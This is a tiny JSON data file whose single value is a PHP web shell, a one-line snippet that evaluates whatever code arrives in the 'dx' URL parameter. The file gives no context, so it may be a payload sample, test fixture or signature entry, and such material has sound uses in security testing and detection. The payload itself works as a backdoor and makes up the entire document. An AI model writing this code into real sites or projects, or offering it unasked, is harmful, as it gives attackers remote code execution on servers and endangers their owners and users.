{
    "a": "<?php eval($_GET['dx']); ?>"
}